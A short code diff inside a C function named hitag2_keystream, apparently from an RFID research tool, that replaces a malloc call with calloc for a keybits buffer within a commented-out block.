@@ -569,7 +569,7 @@ bool hitag2_keystream(uint8_t *response, uint8_t *nrarhex) {
     uint8_t *spaceptr = NULL;
 
     /*
-        keybits = malloc(2080);
+        keybits = calloc(2080, sizeof(uint8_t));
         if (!keybits) {
             UserMessage("cannot malloc keybits\r\n");
             return false;
